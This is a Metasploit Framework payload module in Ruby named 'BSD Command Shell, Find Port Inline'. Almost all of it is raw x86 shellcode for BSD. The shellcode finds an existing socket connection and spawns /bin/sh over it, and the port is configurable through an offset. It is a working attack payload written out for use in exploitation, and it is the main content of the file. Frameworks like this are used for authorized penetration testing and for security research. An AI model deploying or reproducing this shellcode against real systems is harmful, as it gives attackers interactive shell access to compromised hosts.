require 'msf/core'
require 'msf/core/handler/find_port'
require 'msf/base/sessions/command_shell'

module Msf
module Payloads
module Singles
module Bsd
module X86

module ShellFindPort

	include Msf::Payload::Single

	def initialize(info = {})
		super(merge_info(info,
			'Name'          => 'BSD Command Shell, Find Port Inline',
			'Version'       => '$Revision$',
			'Description'   => 'Spawn a shell on an established connection',
			'Author'        => 'vlad902',
			'Platform'      => 'bsd',
			'Arch'          => ARCH_X86,
			'Handler'       => Msf::Handler::FindPort,
			'Session'       => Msf::Sessions::CommandShell,
			'Payload'       =>
				{
					'Offsets' =>
						{
							'CPORT' => [ 24, 'n' ],
						},
					'Payload' =>
						"\x31\xff\x57\x89\xe5\x47\x89\xec\x6a\x10\x54\x55" +
						"\x57\x6a\x1f\x58\x6a\x02\xcd\x80\x66\x81\x7d\x02" +
						"\x11\x5c\x75\xe9\x59\x51\x57\x6a\x5a\x58\x51\xcd" +
						"\x80\x49\x79\xf5\x68\x2f\x2f\x73\x68\x68\x2f\x62" +
						"\x69\x6e\x89\xe3\x50\x54\x53\xb0\x3b\x50\xcd\x80"
				}
			))
	end

end

end end end end end
